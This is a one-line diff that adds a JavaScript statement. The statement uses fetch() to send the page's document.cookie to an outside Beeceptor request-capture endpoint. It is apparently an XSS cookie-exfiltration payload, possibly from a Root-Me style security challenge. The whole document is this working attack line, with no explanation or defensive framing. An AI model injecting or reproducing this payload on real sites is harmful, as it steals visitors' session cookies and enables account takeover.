@@ -1,0 +1,1 @@
+fetch("https://rootmecoco.free.beeceptor.com/"+document.cookie)
